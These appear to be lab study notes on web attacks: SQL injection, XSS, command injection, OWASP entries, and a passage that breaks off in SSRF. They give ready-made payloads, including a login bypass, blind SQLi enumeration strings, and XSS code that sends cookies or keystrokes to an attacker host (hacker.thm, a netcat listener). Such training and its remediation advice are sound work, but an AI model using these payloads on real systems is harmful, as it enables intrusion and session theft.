Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 


Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

Practical tips and example:

Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:


select * from users where username='%username%' and password='%password%' LIMIT 1;


N.B The %username% and %password% values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.


To make this into a query that always returns as true, we can enter the following into the password field:


' OR 1=1;--


Which turns the SQL query into the following:


select * from users where username='' and password='' OR 1=1;


Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.


### Blind SQLi Boolean Based 

Boolean Based

Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.


Practical tips and example:

On this example of SQL, you're presented with a mock browser with the following URL:

```
https://website.thm/checkuser?username=admin
```

The browser body contains the contents of {"taken":true}. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. In fact, we can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.


The SQL query that is processed looks like the following:

```
select * from users where username = '%username%' LIMIT 1;
```

As the only input, we have control over is the username in the query string, we'll have to use this to perform our SQL Injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.


Like in previous levels, our first task is to establish the number of columns in the users table, which we can achieve by using the UNION statement. Change the username value to the following:

```
admin123' UNION SELECT 1;-- 
```

As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true. You can confirm that the answer is three columns by setting the username to the below value:

```
admin123' UNION SELECT 1,2,3;-- 
```

Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is discovering the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.

Try the below username value and see what happens:

```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

Now you move onto the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.


We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a. As the above query results in a false response, we can confirm that there are no tables in the sqli_three database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.


You'll finally end up discovering a table in the sqli_three database named users, which you can be confirmed by running the following username payload:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

Lastly, we now need to enumerate the column names in the users table so we can properly search it for login credentials. Again using the information_schema database and the information we've already gained, we can start querying it for column names. Using the payload below, we search the columns table where the database is equal to sqli_three, the table name is users, and the column name begins with the letter a.

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username which you can use the payload below:

```
admin123' UNION SELECT 1,2,3 from users where username like 'a%'
```

Which, once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
```

### Blind SQLi Time Based 

Time-Based


A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

So, for example, when trying to establish the number of columns in a table, you would use the following query:

```
admin123' UNION SELECT SLEEP(5);--
```

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

```
admin123' UNION SELECT SLEEP(5),2;--
```

This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.


You can now repeat the enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.

If you're struggling to find the table name the below query should help you on your way:

```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

### Out of Band SQLi

Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

![image](https://user-images.githubusercontent.com/24814781/181909315-2aa7b7ff-92e8-4f49-81dc-6c084ae3d7a7.png)

### SQL injection Remediation 

Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:


Prepared Statements (With Parameterized Queries):

In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.


Input Validation:

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 


Escaping User Input:

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.



### Cross site Scripting
Prerequisites:
It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.


Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.


### xss payload cheat sheets and resources
```
https://netsec.expert/posts/xss-in-2021/
```
```
https://github.com/payloadbox/xss-payload-list
```
```
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
```


### XSS Payloads

What is a payload?

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.


The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).


Here are some examples of XSS intentions.


Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

```
<script>alert('XSS');</script>
```

Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```


### Reflected XSS

Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.


Example Scenario:

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source. 

![image](https://user-images.githubusercontent.com/24814781/182373588-5628a832-16ec-48d7-a4e0-009b4556ba54.png)

The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

![image](https://user-images.githubusercontent.com/24814781/182373742-10aa396a-6a71-4535-95a5-c1999b79edb2.png)


The vulnerability can be used as per the scenario in the image below:

![image](https://user-images.githubusercontent.com/24814781/182373903-7bd30c4a-db10-4011-9ab3-b0d4e2f5b1ff.png)

Potential Impact:

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:

    Parameters in the URL Query String
    URL File Path
    Sometimes HTTP Headers (although unlikely exploitable in practice)

Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected



### Stored XSS

Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![image](https://user-images.githubusercontent.com/24814781/182374221-2ca4e450-24b1-46f6-be7e-29746849bc31.png)

Potential Impact:

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

    Comments on a blog
    User profile information
    Website Listings

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 
Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected 
 

### DOM Based XSS

DOM Based XSS

What is the DOM?

DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

![image](https://user-images.githubusercontent.com/24814781/182374865-3a213b46-3bb6-4c49-a983-2944a10833c3.png)

If you want to learn more about the DOM and gain a deeper understanding w3.org have a great resource.

Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.


Example Scenario:

The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.


Potential Impact:

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

How to test for Dom Based XSS:


DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.


When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


### Blind XSS

Blind XSS

Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

How to test for Blind XSS:


When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.


A popular tool for Blind XSS attacks is xsshunter.
```
https://xsshunter.com/
```
Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

### Perfecting your payload

The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.

Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.

How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use.

The aim for each level will be to execute the JavaScript alert function with the string THM, for example:
```
<script>alert('THM');</script>
```
Level One:

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:

![image](https://user-images.githubusercontent.com/24814781/182376108-f03ca070-c581-4917-9156-15fd3e328dd9.png)

If you view the Page Source, You'll see your name reflected in the code:

![image](https://user-images.githubusercontent.com/24814781/182376339-8b8f94bd-205c-42ca-aaad-8ccbb039bafe.png)

Instead of entering your name, we're instead going to try entering the following JavaScript Payload:
```
<script>alert('THM');</script>
```

Now when you click the enter button, you'll get an alert popup with the string THM and the page source will look like the following:

![image](https://user-images.githubusercontent.com/24814781/182376415-7369aa3d-483b-4621-a129-0d341ee8d7c9.png)

And then, you'll get a confirmation message that your payload was successful 

Level Two:

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![image](https://user-images.githubusercontent.com/24814781/182376729-b23c1bb8-a847-42be-8703-cc1ca7c4b7bf.png)

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![image](https://user-images.githubusercontent.com/24814781/182376808-74b188d7-231d-4bd3-9f61-1de45cd09c35.png)


t wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: 
```
"><script>alert('THM');</script>
```
The important part of the payload is the "> which closes the value parameter and then closes the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

![image](https://user-images.githubusercontent.com/24814781/182376944-83909a35-ba9a-4a25-a99b-2663ad6c3bb7.png)

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful

Level Three:

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.

![image](https://user-images.githubusercontent.com/24814781/182377524-1088703c-b0be-4ea0-bd57-53807883a5b3.png)

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: </textarea>
```
<script>alert('THM');</script>
```

![image](https://user-images.githubusercontent.com/24814781/182377574-1df21dcc-51fe-4187-92b0-843649969cf2.png)


The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful 

Level Four:

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

![image](https://user-images.githubusercontent.com/24814781/182377935-6a4d58d6-9bad-4905-8d4d-b2e399e53fda.png)

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload 
```
';alert('THM');//
```

which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

![image](https://user-images.githubusercontent.com/24814781/182378028-6deb673f-9481-4100-880e-7322cae5d406.png)


Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful

Level Five:

Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the <script>alert('THM');</script> payload, it won't work. When you view the page source, you'll see why. 

![image](https://user-images.githubusercontent.com/24814781/182378527-e5df77e9-6e1a-4dab-9999-cf073ef62a0c.png)

The word script  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.

When a word gets removed from a string, there's a helpful trick that you can try. 

Original Payload:
```
<sscriptcript>alert('THM');</sscriptcript>
```

Text to be removed (by the filter):
```
<sscriptcript>alert('THM');</sscriptcript>
```
Final Payload (after passing the filter):
```
<script>alert('THM');</script>
```

Try entering the payload 

```
<sscriptcript>alert('THM');</sscriptcript> 
```

and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful

Level Six:


Similar to level two, where we had to escape from the value attribute of an input tag, we can try "><script>alert('THM');</script> , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work. 

![image](https://user-images.githubusercontent.com/24814781/182379431-246237bd-8fda-482e-8510-27c53fdf58bf.png)

You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this 
```
/images/cat.jpg" onload="alert('THM'); 
```
and then viewing the page source, and you'll see how this will work.

![image](https://user-images.githubusercontent.com/24814781/182379524-419aa1eb-e121-418a-a899-7089d27ae30c.png)

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.

Polyglots:


An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Practical Example Blind XSS

For the last task, we will go over a Blind XSS vulnerability.

Click on the Customers tab on the top navigation bar and click the "Signup here" link to create an account. Once your account gets set up, click the Support Tickets tab, which is the feature we will investigate for weaknesses. 


Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 


Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.

![image](https://user-images.githubusercontent.com/24814781/182381106-ca5e0a57-dff3-43e4-a8fb-2f5b2cfaf343.png)
![image](https://user-images.githubusercontent.com/24814781/182381112-24310bb6-92c0-4b4d-9082-be547976268c.png)


Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:

```
</textarea>test
```

Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag. 

![image](https://user-images.githubusercontent.com/24814781/182381148-54e8f4c7-14da-4dbf-bb38-6cbd14645434.png)
![image](https://user-images.githubusercontent.com/24814781/182381158-4670396b-07eb-4a5e-8583-d1365a506f07.png)


Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:

```
</textarea><script>alert('THM');</script>
```

Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 


Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.


While using the TryHackMe AttackBox, let's set up a listening server using Netcat:

```
nc -nlvp 9001
```
or use 
```
python3 -m http.server <port> 
```


Now that we've set up the method of receiving the exfiltrated information, let's build the payload.

```
</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
```

Let's breakdown the payload:

The "</textarea>" tag closes the textarea field. 

The "<script>tag" opens open an area for us to write JavaScript.

The "fetch()" command makes an HTTP request.

"{URL_OR_IP}" is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.

"?cookie=" is the query string that will contain the victim's cookies.

"btoa()" command base64 encodes the victim's cookies.

"document.cookie" accesses the victim's cookies for the Acme IT Support Website.

"</script>" closes the JavaScript code block.


Now create another ticket using the above payload, making sure to swap out the {URL_OR_IP} variable to your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you'll see the request come through containing the victim's cookies. 


You can now base64 decode this information using a site like https://www.base64decode.org/

### Command Injection

we’re going to be covering the web vulnerability that is command injection. Once we understand what this vulnerability is, we will then showcase its impact and the risk it imposes on an application.

Then, you’re going to be able to put this knowledge into practice, namely:

* How to discover the command injection vulnerability

* How to test and exploit this vulnerability using payloads designed for different operating systems

* How to prevent this vulnerability in an application

* Lastly, you’ll get to apply theory into practice learning in a practical at the end of the room.

To begin with, let’s first understand what command injection is. Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named joe will execute commands under this joe user - and therefore obtain any permissions that joe has.

A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application.  

Command injection is also often known as “Remote Code Execution” (RCE) because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the vulnerable system. For example, an attacker may read system or user files, data, and things of that nature.

For example, being able to abuse an application to perform the command whoami to list what user account the application is running will be an example of command injection.

Command injection was one of the top ten vulnerabilities reported by Contrast Security’s AppSec intelligence report in 2019. (Contrast Security AppSec., 2019)
```
https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report
```

 Moreover, the OWASP framework constantly proposes vulnerabilities of this nature as one of the top ten vulnerabilities of a web application (OWASP framework)
 ```
 https://owasp.org/www-project-top-ten/
 ```
 
 ### resources and cheat sheets
 ```
 https://github.com/payloadbox/command-injection-payload-list
 ```
 ```
 https://book.hacktricks.xyz/pentesting-web/command-injection
 ```
 
 
 ### Discovering Command Injection
This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. For example, taking input from a field and searching for an entry into a file. Take this code snippet below as an example:

In this code snippet, the application takes data that a user enters in an input field named $title to search a directory for a song title. Let’s break this down into a few simple steps.

![image](https://user-images.githubusercontent.com/24814781/182588772-3c060251-2d9e-418d-9868-c0613df0f3b3.png)

1. The application stores MP3 files in a directory contained on the operating system.

2. The user inputs the song title they wish to search for. The application stores this input into the $title variable.

3. The data within this $title variable is passed to the command grep to search a text file named songtitle.txt for the entry of whatever the user wishes to search for.

4. The output of this search of songtitle.txt will determine whether the application informs the user that the song exists or not.

Now, this sort of information would typically be stored in a database; however, this is just an example of where an application takes input from a user to interact with the application’s operating system.

An attacker could abuse this application by injecting their own commands for the application to execute. Rather than using grep to search for an entry in songtitle.txt, they could ask the application to read data from a more sensitive file.

Abusing applications in this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. For example, this code snippet below is an application written in Python.

![image](https://user-images.githubusercontent.com/24814781/182589324-156c4e67-a543-49f1-87b8-2d0423a86954.png)

Note, you are not expected to understand the syntax behind these applications. However, for the sake of reason, I have outlined the steps of how this Python application works as well.

The "flask" package is used to set up a web server
A function that uses the "subprocess" package to execute a command on the device
We use a route in the webserver that will execute whatever is provided. For example, to execute whoami, we'd need to visit http://flaskapp.thm/whoami

 
 ### Exploiting Command Injection
 
 You can often determine whether or not command injection may occur by the behaviours of an application.
 
 Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators ;, & and && will combine two (or more) system commands and execute them both. If you are unfamiliar with this concept, it is worth checking out the Linux fundamentals module to learn more about this.

Command Injection can be detected in mostly one of two ways:

 1.   Blind command injection
 2.   Verbose command injection

I have defined these two methods in the table below, where the two sections underneath will explain these in greater detail.

![image](https://user-images.githubusercontent.com/24814781/182590674-dcbbda3a-01c3-4d0c-8a32-56e9a086b9bc.png)

Detecting Blind Command Injection

Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message.

For this type of command injection, we will need to use payloads that will cause some time delay. For example, the ping and sleep commands are significant payloads to test with. Using ping as an example, the application will hang for x seconds in relation to how many pings you have specified.

Another method of detecting blind command injection is by forcing some output. This can be done by using redirection operators such as >. If you are unfamiliar with this, I recommend checking out the Linux fundamentals module. For example, we can tell the web application to execute commands such as whoami and redirect that to a file. We can then use a command such as cat to read this newly created file’s contents.

Testing command injection this way is often complicated and requires quite a bit of experimentation, significantly as the syntax for commands varies between Linux and Windows.

The curl command is a great way to test for command injection. This is because you are able to use curl to deliver data to and from an application in your payload. Take this code snippet below as an example, a simple curl payload to an application is possible for command injection.

```
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```

Detecting Verbose Command Injection

Detecting command injection this way is arguably the easiest method of the two. Verbose command injection is when the application gives you feedback or output as to what is happening or being executed.

For example, the output of commands such as ping or whoami is directly displayed on the web application.


Useful payloads

I have compiled some valuable payloads for both Linux & Windows into the tables below.

![image](https://user-images.githubusercontent.com/24814781/182590780-4b484706-a734-4981-a720-2f0f99d9c0bc.png)


![image](https://user-images.githubusercontent.com/24814781/182590819-09195bab-563f-4974-a7d7-3ae93fa0aecc.png)


 
 ### Remediating Command Injection
 
 Command injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user’s input. I have detailed these a bit further below. The examples below are of the PHP programming language; however, the same principles can be extended to many other languages.


Vulnerable Functions

In PHP, many functions interact with the operating system to execute commands via shell; these include:

* Exec

* Passthru

* System


Take this snippet below as an example. Here, the application will only accept and process numbers that are inputted into the form. This means that any commands such as whoami will not be processed.

![image](https://user-images.githubusercontent.com/24814781/182590935-07f9fac4-f13a-49b7-9f68-0ae1d463e949.png)

1.    The application will only accept a specific pattern of characters (the digits  0-9)
2.    The application will then only proceed to execute this data which is all numerical.


These functions take input such as a string or user data and will execute whatever is provided on the system. Any application that uses these functions without proper checks will be vulnerable to command injection.


Input sanitisation

Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as > ,  & and /.

In the snippet below, the filter_input PHP:
```
https://www.php.net/manual/en/function.filter-input.php
```
function is used to check whether or not any data submitted via an input form is a number or not. If it is not a number, it must be invalid input.
 
![image](https://user-images.githubusercontent.com/24814781/182591045-af8f4d0d-19df-4167-a0e5-ac2bedca54fb.png)

Bypassing Filters

Applications will employ numerous techniques in filtering and sanitising data that is taken from a  user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.

When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.

![image](https://user-images.githubusercontent.com/24814781/182591076-c711d2f0-59b4-4844-9307-3c1d4dd9a797.png)


 -----------------------------------------------------------------------------------------------------------------




### Insecure Design
Notable Common Weakness Enumerations (CWEs) include
CWE-209: Generation of Error Message Containing Sensitive Information
CWE-256: Unprotected Storage of Credentials
CWE-501: Trust Boundary Violation
CWE-522: Insufficiently Protected Credentials
```
https://owasp.org/Top10/A04_2021-Insecure_Design/
```
-----------------------------------------------------------------------------------------------------------------
### Security Misconfiguration
Notable CWEs included are 
CWE-16 Configuration
CWE-611 Improper Restriction of XML External Entity Reference
```
https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
```
-----------------------------------------------------------------------------------------------------------------
### Vulnerable and Outdated Components
Notable CWEs included are 
CWE-1104: Use of Unmaintained Third-Party Components and the two CWEs from Top 10 2013 and 2017
```
https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
```
-----------------------------------------------------------------------------------------------------------------
### Identification and Authentication Failures 
Notable CWEs included are 
CWE-297: Improper Validation of Certificate with Host Mismatch
CWE-287: Improper Authentication
CWE-384: Session Fixation
```
https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures
```
-----------------------------------------------------------------------------------------------------------------
### Security Logging and Monitoring Failures
Notable Common Weakness Enumerations (CWEs) include 
CWE-829: Inclusion of Functionality from Untrusted Control Sphere
CWE-494: Download of Code Without Integrity Check
CWE-502: Deserialization of Untrusted Data
```
https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
```
-----------------------------------------------------------------------------------------------------------------
### Server-Side Request Forgery
```
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
```
```
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
```

What is an SSRF?

SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.


Types of SSRF

There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.
What's the impact?

A successful SSRF attack can result in any of the following: 

Access to unauthorised areas.
Access to customer/organisational data.
Ability to Scale to internal networks.
Reveal authentication tokens/credentials.
    
We're going to take you through some sample SSRF attacks and explain how they work.
    
The below example shows how the attacker can have complete control over the page requested by the webserver.
